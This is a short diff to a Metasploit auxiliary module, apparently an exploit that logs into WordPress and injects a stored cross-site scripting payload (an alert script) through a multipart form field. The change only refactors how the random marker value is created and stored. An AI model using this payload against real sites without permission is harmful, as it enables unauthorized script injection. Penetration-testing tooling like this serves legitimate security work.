@@ -58,7 +58,8 @@ class Metasploit4 < Msf::Auxiliary
     cookie = wordpress_login(user, password)
     fail_with(Failure::NoAccess, "Unable to login as: #{user}:#{password}") if cookie.nil?
 
-    xss = "\"><script>alert(#{Rex::Text.rand_text_numeric(8)})</script>"
+    value = Rex::Text.rand_text_numeric(8)
+    xss = "\"><script>alert(#{value})</script>"
 
     data = Rex::MIME::Message.new
     data.add_part('M', nil, nil, 'form-data; name="uptime"')
@@ -88,7 +89,7 @@ class Metasploit4 < Msf::Auxiliary
         'eshop.http',
         'text/html',
         res.body,
-        xss
+        value
       )
       print_good("Save in: #{p}")
     else
